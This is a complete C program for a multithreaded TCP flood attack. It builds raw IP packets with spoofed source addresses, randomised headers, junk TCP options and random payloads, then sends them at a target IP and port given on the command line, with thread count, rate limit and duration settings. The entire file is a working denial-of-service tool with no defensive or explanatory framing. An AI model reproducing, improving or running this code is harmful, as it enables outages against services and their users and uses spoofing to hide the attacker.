#include <time.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netdb.h>
#include <net/if.h>
#include <arpa/inet.h>
#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9
#define MAX_PAYLOAD_SIZE 1400
static unsigned long int Q[4096], c = 362436;
static unsigned int floodport;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;

static const char PAYLOAD[] = "\x05\x0a\x7e\xb0\x7e\xb0\x53\x46\x5e\x7e\xb0\x53\x47\x0a\x7e\xb0\x53";
int windows[3] = {8192, 64240, 65535};

struct tcpopts
{
    uint8_t kind;
    uint8_t length;
    uint8_t data[6];
};
void init_rand(unsigned long int x)
{
    int i;
    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;
    for (i = 3; i < 4096; i++)
    {
        Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
    }
}

unsigned long int rand_cmwc(void)
{
    unsigned long long int t, a = 18782LL;
    static unsigned long int i = 4095;
    unsigned long int x, r = 0xfffffffe;
    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (t >> 32);
    x = t + c;
    if (x < c)
    {
        x++;
        c++;
    }
    return (Q[i] = r - x);
}

int randnum(int min_num, int max_num)
{
    int result = 0, low_num = 0, hi_num = 0;

    if (min_num < max_num)
    {
        low_num = min_num;
        hi_num = max_num + 1;
    }
    else
    {
        low_num = max_num + 1;
        hi_num = min_num;
    }

    result = (rand_cmwc() % (hi_num - low_num)) + low_num;
    return result;
}

unsigned short csum(unsigned short *buf, int count)
{
    register unsigned long sum = 0;
    while (count > 1)
    {
        sum += *buf++;
        count -= 2;
    }

    if (count > 0)
    {
        sum += *(unsigned char *)buf;
    }

    while (sum >> 16)
    {
        sum = (sum & 0xffff) + (sum >> 16);
    }

    return (unsigned short)(~sum);
}

unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph, int payloadLen)
{
    struct tcp_pseudo
    {
        unsigned long src_addr;
        unsigned long dst_addr;
        unsigned char zero;
        unsigned char proto;
        unsigned short length;
    }

    pseudohead;
    unsigned short total_len = iph->tot_len;
    pseudohead.src_addr = iph->saddr;
    pseudohead.dst_addr = iph->daddr;
    pseudohead.zero = 0;
    pseudohead.proto = IPPROTO_TCP;
    pseudohead.length = htons(sizeof(struct tcphdr) + payloadLen);
    int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr) + payloadLen;
    unsigned short *tcp = malloc(totaltcp_len);
    if (!tcp)
    {
        perror("malloc failed");
        exit(-1);
    }
    memcpy((unsigned char *)tcp, &pseudohead, sizeof(struct tcp_pseudo));
    memcpy((unsigned char *)tcp + sizeof(struct tcp_pseudo), (unsigned char *)tcph, sizeof(struct tcphdr) + payloadLen);
    unsigned short output = csum(tcp, totaltcp_len);
    free(tcp);
    return output;
}

void setup_ip_header(struct iphdr *iph)
{
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpopts) + sizeof(PAYLOAD) - 1;
    iph->id = htonl(54321);
    iph->frag_off = htons(0x4000);
    iph->ttl = MAXTTL;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;
    iph->saddr = inet_addr("0.0.0.0");
}

void setup_tcp_header(struct tcphdr *tcph, struct tcpopts *opts)
{
    tcph->source = htons(5678);
    tcph->check = 0;
    tcph->psh = 1;
    tcph->ack = 1;
    tcph->urg = 0;
    tcph->ack_seq = randnum(10000, 99999);
    tcph->urg_ptr = 0;
    tcph->window = htons(64240);
    tcph->doff = ((sizeof(struct tcphdr)) + sizeof(struct tcpopts)) / 4;
    memcpy((void *)tcph + sizeof(struct tcphdr), opts, sizeof(struct tcpopts));
}

char *genPayload(int size)
{
    char *newPayload = (char *)malloc(size);
    for (int i = 0; i < size; i++)
    {
        if (i % 2 == 0)
        {
            for (size_t num = 0; num < (i / 2); num++)
            {
                newPayload[num] = randnum(1, size);
                newPayload[i] = rand_cmwc() % (256 + num);
            }
        }
        else
        {
            newPayload[i] = randnum(1, size);
        }
    }

    // printf("Payload: %s\n", newPayload);
    return newPayload;
}
void setupTcpOpts(struct tcpopts *opts)
{
    opts->kind = 0x70;
    opts->length = 0x80;
    memcpy(opts->data, genPayload(6), 6);
}

void *flood(void *par1)
{
    char *td = (char *)par1;
    char datagram[MAX_PACKET_SIZE];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
    struct tcpopts *opts = (void *)iph + sizeof(struct iphdr) + sizeof(struct tcphdr);
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(floodport);
    sin.sin_addr.s_addr = inet_addr(td);
    int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if (s < 0)
    {
        perror("Could not open raw socket");
        exit(-1);
    }

    memset(datagram, 0, MAX_PACKET_SIZE);
    setup_ip_header(iph);
    setupTcpOpts(opts);
    setup_tcp_header(tcph, opts);
    tcph->dest = htons(floodport);
    iph->daddr = sin.sin_addr.s_addr;
    iph->check = csum((unsigned short *)datagram, iph->tot_len);
    int tmp = 1;
    const int *val = &tmp;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(tmp)) < 0)
    {
        perror("Error: setsockopt() - Cannot set HDRINCL");
        exit(-1);
    }

    init_rand(time(NULL));
    register unsigned int i;
    i = 0;
    while (1)
    {

        memcpy(opts->data, genPayload(6), 6);
        tcph->check = 0;
        tcph->doff = 8;
        tcph->dest = htons(floodport);
        iph->ttl = randnum(64, 255);
        tcph->source = htons(randnum(1023, 65535));
        tcph->window = htons(windows[randnum(0, 2)]);

        uint8_t first_octet_options[16] = {151, 188, 37, 51, 176, 5, 92, 172, 8, 198, 192, 155, 140, 144, 55, 132};
        uint8_t second_octet_options[16] = {80, 165, 187, 89, 31, 196, 222, 64, 46, 41, 112, 155, 1, 170, 32, 128};
        uint8_t third_octet_options[8] = {1, randnum(1, 255), 255, 113, 16, 36, 128, 192};
        uint8_t fourth_octet_options[8] = {1, randnum(1, 255), 255, 4, 10, 32, 64, 16};
        uint8_t first_octet = first_octet_options[randnum(0, 15)];
        uint8_t second_octet = second_octet_options[randnum(0, 15)];
        uint8_t third_octet = third_octet_options[randnum(0, 7)];
        uint8_t fourth_octet = fourth_octet_options[randnum(0, 7)];

        int finSet = randnum(0, 1);
        if (finSet == 1)
        {
            tcph->fin = 1;
            if (randnum(0, 1) == 1)
            {
                tcph->urg_ptr = htons(randnum(2048, 65535));
            }
            else
            {
                tcph->urg_ptr = htons(0);
            }
            for (int i = 0; i <= 1; i++)
            {
                if (i == 1)
                {
                    tcph->fin = 0;
                }
                int randomPayloadLength = randnum(128, 512);
                char *randomPayload = genPayload(randomPayloadLength);

                memcpy((void *)tcph + (sizeof(struct tcphdr) + sizeof(struct tcpopts)), randomPayload, randomPayloadLength - 1);
                iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpopts) + randomPayloadLength - 1;
                tcph->seq = htonl(rand_cmwc() & 0xFFFFFFFFF);
                tcph->ack_seq = randnum(10000, 99999);
                iph->saddr = (fourth_octet << 24) | (third_octet << 16) | (second_octet << 8) | (first_octet);
                iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
                iph->check = csum((unsigned short *)datagram, sizeof(struct iphdr));
                tcph->check = tcpcsum(iph, tcph, randomPayloadLength - 1 + sizeof(struct tcpopts));
                if (sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
                {
                    perror("Error: sendto failed");
                }
            }
        }
        else
        {
            tcph->fin = 0;
            tcph->urg_ptr = htons(randnum(2048, 65535));
            int randomPayloadLength = randnum(256, 512);
            char *randomPayload = genPayload(randomPayloadLength);

            memcpy((void *)tcph + (sizeof(struct tcphdr) + sizeof(struct tcpopts)), randomPayload, randomPayloadLength - 1);
            iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpopts) + randomPayloadLength - 1;
            tcph->seq = htonl(rand_cmwc() & 0xFFFFFFFFF);
            tcph->ack_seq = randnum(10000, 99999);
            iph->saddr = (first_octet << 24) | (second_octet << 16) | (rand_cmwc() >> 8 & 0xFF) << 8 | (rand_cmwc() & 0xFF);
            iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
            iph->check = csum((unsigned short *)datagram, sizeof(struct iphdr));
            tcph->check = tcpcsum(iph, tcph, randomPayloadLength - 1 + sizeof(struct tcpopts));
            if (sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
            {
                perror("Error: sendto failed");
            }
        }

        pps++;
        if (i >= limiter)
        {
            i = 0;
            usleep(sleeptime);
        }

        i++;
    }
}

int main(int argc, char *argv[])
{
    if (argc < 6)
    {
        fprintf(stderr, "Usage: %s <target IP> <port> <threads> <pps limiter, -1 for no limit> <time>\n", argv[0]);
        exit(-1);
    }
    srand((unsigned int)time(NULL));
    fprintf(stdout, "Setting up Sockets...\n");
    int num_threads = atoi(argv[3]);
    floodport = atoi(argv[2]);
    int maxpps = atoi(argv[4]);
    limiter = 0;
    pps = 0;
    pthread_t thread[num_threads];
    int multiplier = 12;
    int i;

    for (i = 0; i < num_threads; i++)
    {
        if (pthread_create(&thread[i], NULL, &flood, (void *)argv[1]) != 0)
        {
            perror("Error: pthread_create failed");
            exit(-1);
        }
    }

    fprintf(stdout, "Starting Flood...\n");
    for (i = 0; i < (atoi(argv[5]) * multiplier); i++)
    {
        usleep((1000 / multiplier) * 1000);
        if ((pps * multiplier) > maxpps)
        {
            if (1 > limiter)
            {
                sleeptime += 100;
            }
            else
            {
                limiter--;
            }
        }
        else
        {
            limiter++;
            if (sleeptime > 25)
            {
                sleeptime -= 25;
            }
            else
            {
                sleeptime = 0;
            }
        }

        pps = 0;
    }

    return 0;
}
